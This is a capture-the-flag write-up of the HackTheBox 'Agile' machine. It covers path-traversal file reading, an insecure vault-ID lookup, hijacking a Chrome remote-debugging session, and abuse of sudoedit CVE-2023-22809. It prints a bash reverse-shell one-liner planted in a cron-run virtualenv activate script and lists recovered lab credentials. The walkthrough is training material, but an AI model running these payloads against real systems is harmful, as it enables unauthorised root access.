---
{"dg-publish":true,"permalink":"/personal-site/completed-writeups/htb/agile/","tags":["#linux","web","flask","gunicorn","chrome-remote-debug-inspect","puppet"]}
---


# 10.10.11.203
---
# Enumeration & Recon
---
start with nmap, only web and ssh

```bash
nmap -sV 10.10.11.203
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 12:00 EST
Nmap scan report for superpass.htb (10.10.11.203)
Host is up (0.15s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 21.31 seconds
```

while capturing everything in burp, visit the site and followed normal user flow. Made an account, checked out the vault. I can xport vault to csv, and maybe there's lfi on `download?fn=../l/f/i`

Looks like there is:  
![Pasted image 20230306134440.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306134440.png)

I got some kind of server error? shows location of source files, going to check out app.py in the lfi above.  
![Pasted image 20230306133757.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306133757.png)

# Exploitation & Getting a Foothold
---
First I checked out the main superpass `app.py` to see if there were any routes I could check out that weren't immediately noticeable.  
![Pasted image 20230306134111.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306134111.png)  
I then checked out `views/vault_views.py`:  
![Pasted image 20230306134724.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306134724.png)  
which shows how vaults are stored. It turns out you can change the row id to view other users' vaults.  
![Pasted image 20230306134820.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306134820.png)  
After checking out other vaults, you can grab "agile" creds for a corum user. The above lfi of /etc/passwd confirms it is a user on the box, potentially machine creds.  
![Pasted image 20230306134910.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306134910.png)  

`user.txt` in home dir.
# Post Exploitation, Pivoting & Privilege Escalation
---
- `sudo -l` corum isn't a sudoer so let's see what's on this box.
- `netstat -tulpn` should always be checked in case there's stuff I can port forward running locally.

```bash
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 127.0.0.1:5000          0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:33060         0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:5555          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      -
tcp6       0      0 :::22                   :::*                    LISTEN      -
udp        0      0 127.0.0.53:53           0.0.0.0:*                           -
udp        0      0 0.0.0.0:68              0.0.0.0:*                           -
```

I see quite a few local ports running that don't look familiar. 22 and 80 of course, and 3306 which is probably the db for the web app. I don't think I need to investigate the db further, and these higher ports stand out to me.

- 5000
- 5555
- 41829
- 33060
- 56765

`5000` seems to just be the web app, grepping ps -aux for the port number

```bash
corum@agile:~$ ps -aux | grep 5000  
www-data    1090  0.0  0.6  31000 24576 ?        Ss   Mar04   0:24 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app  
www-data    1092  0.1  1.8 819100 72836 ?        Sl   Mar04   2:45 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
```

`5555` seems to be a dev app? the main page did say it was "tested and redeployed constantly."

```bash
corum@agile:~$ ps -aux | grep 5555  
runner      1089  0.0  0.6  31000 24396 ?        Ss   Mar04   0:25 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app  
runner      1093  0.0  1.5  80936 63064 ?        S    Mar04   1:02 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
```

`41829` seems to be google chrome with a remote debugging port.
- chrome allows you to inspect remote devices, so we should forward that port

```bash
corum@agile:~$ ps -aux | grep 41829  
runner    110944  0.1  2.6 34023392 104880 ?     Sl   18:50   0:00 /usr/bin/google-chrome --allow-pre-commit-input --crash-dumps-dir=/tmp --disable-background-networking --disable-client-side-phishing-detection --disable-def  
ault-apps --disable-gpu --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --enable-automation --enable-blink-features=ShadowDOMV0 --enable-logging --headless --log-level=0 --no-first-r  
un --no-service-autorun --password-store=basic --remote-debugging-port=41829 --test-type=webdriver --use-mock-keychain --user-data-dir=/tmp/.com.google.Chrome.6KWopQ --window-size=1420,1080 data:,  
runner    111008  0.3  3.9 1184772548 158568 ?   Sl   18:50   0:01 /opt/google/chrome/chrome --type=renderer --headless --crashpad-handler-pid=110951 --lang=en-US --enable-automation --enable-logging --log-level=0 --remote-d  
ebugging-port=41829 --test-type=webdriver --allow-pre-commit-input --ozone-platform=headless --disable-gpu-compositing --enable-blink-features=ShadowDOMV0 --lang=en-US --num-raster-threads=1 --renderer-client-id=5 --time-tic  
ks-at-unix-epoch=-1677964553978776 --launch-time-ticks=164048938381 --shared-files=v8_context_snapshot_data:100 --field-trial-handle=0,i,11428599080248289309,6967549487514426565,131072 --disable-features=PaintHolding
```

Forward the port with ssh, and configure the network target in `chrome://inspect` at 127.0.0.1:41829.  
[info here](https://umaar.com/dev-tips/80-inspect-device-workflow/)  
  
Turns out to be the dev version of the app, and it's logged in. 
![Pasted image 20230306140224.png](https://the-mug-bog.vercel.app/img/user/DG-mug-bog/Pasted%20image%2020230306140224.png)

We can see some credentials for an "edwards" in here and we can probably pivot to edwards, confirmed by `/etc/passwd` and an `ls /home`

```bash
edwards@agile:~$ sudo -l
[sudo] password for edwards:
Matching Defaults entries for edwards on agile:
env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
(dev_admin : dev_admin) sudoedit /app/config_test.json
(dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

So it seems I can sudoedit these files. I found this exploit:
https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf

Seems that by specifying an editor with this exploit we can edit other files owned by the user we are sudoediting as - in this case dev_admin - that aren't allowed in the above sudo policy.  
Maybe we can spawn a reverse shell doing this. But first we need to find some other files owned by the dev_admin or the group has access to.
### rumination 

Looking at the app directory and the `ps -aux` grepped output from earlier from ports 5000/5555, it's running gunicorn.  
Looking at gunicorn deployment documentation: https://docs.gunicorn.org/en/stable/deploy.html#using-virtualenv, it shows how to deploy a webapp using it.

I found the venv directory at /app/venv which matches the above process. In /app/venv/bin/ there's the activation scripts like the documentation said.

Now, since there was also a development version of the app, and the main site said that the site was constantly being tested and redeployed, I figured this was the cause of my weird disconnect and stack trace errors. There's probably a cron job running this initial setup regularly to redeploy the web app.  
  
Lo and behold, the activation scripts are owned by root, but the dev_admin group can write to them.

```bash
edwards@agile:/app/venv/bin$ ls -al
total 1380
drwxrwxr-x 2 root dev_admin    4096 Mar  6 19:12 .
drwxrwxr-x 5 root dev_admin    4096 Feb  8 16:29 ..
-rw-r--r-- 1 root dev_admin    9033 Mar  6 19:12 Activate.ps1
-rw-rw-r-- 1 root dev_admin    1976 Mar  6 19:12 activate
-rw-r--r-- 1 root dev_admin     902 Mar  6 19:12 activate.csh
-rw-r--r-- 1 root dev_admin    2044 Mar  6 19:12 activate.fish
-rwxrwxr-x 1 root root          213 Mar  6 19:12 flask
-rwxr-xr-x 1 root root          222 Jan 24 18:06 gunicorn
-rwxrwxr-x 1 root root          226 Mar  6 19:12 pip
-rwxrwxr-x 1 root root          226 Mar  6 19:12 pip3
-rwxrwxr-x 1 root root          226 Mar  6 19:12 pip3.10
-rwxrwxr-x 1 root root          226 Mar  6 19:12 py.test
-rwxrwxr-x 1 root root          226 Mar  6 19:12 pytest
lrwxrwxrwx 1 root root            7 Mar  6 19:12 python -> python3
lrwxrwxrwx 1 root root           16 Mar  6 19:12 python3 -> /usr/bin/python3
lrwxrwxrwx 1 root root            7 Mar  6 19:12 python3.10 -> python3
-rwxrwxr-x 1 root root      1349984 Jan 23 21:45 uwsgi
```

Exactly what we needed.

## Root Privilege Escalation

Grabbing the exploit from the paper I found above, I set the full exploit to:

```bash
$ EDITOR='vim -- /app/venv/bin/activate' sudo -u dev_admin sudoedit /app/config_test.json
```

At the top of the activate shell script I put in a bash reverse shell one liner

```bash
# This file must be used with "source bin/activate" *from bash*  
# you cannot run it directly
bash -i >& /dev/tcp/$ATTACKER_IP/$ATT_PORT 0>&1

```

Then just wait for the cron job to reactivate:
```bash
Connection from 10.10.11.203:45944 
bash: cannot set terminal process group (112011): Inappropriate ioctl for device 
bash: no job control in this shell 
root@agile:~#
```
# Found Creds
`corum:5db7caa1d13cc37c9fc2`
`edwards:d07867c6267dcb5df0af`
